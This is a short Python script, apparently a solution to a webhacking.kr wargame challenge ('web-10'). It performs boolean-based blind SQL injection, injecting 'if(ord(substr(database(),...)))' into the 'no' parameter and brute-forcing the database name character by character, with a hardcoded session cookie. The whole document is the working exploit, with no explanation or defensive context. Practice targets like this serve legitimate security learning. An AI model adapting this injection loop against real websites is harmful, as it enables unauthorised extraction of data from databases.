import requests
cookies={'PHPSESSID':'a3c32m5qduvu2lp5ib6g2i92iq'}
key='<td>1</td>'
for i in range(8): 
    for j in range(20,128):   
        url='https://webhacking.kr/challenge/web-10/?no='
        url=url+f'if(ord(substr(database(),{i},1))in({j}),1,11)'
        response=requests.get(url=url,cookies=cookies)
        response_text=response.text
        if response_text.find(key) != -1:
            print(chr(j),end="")
print("\n")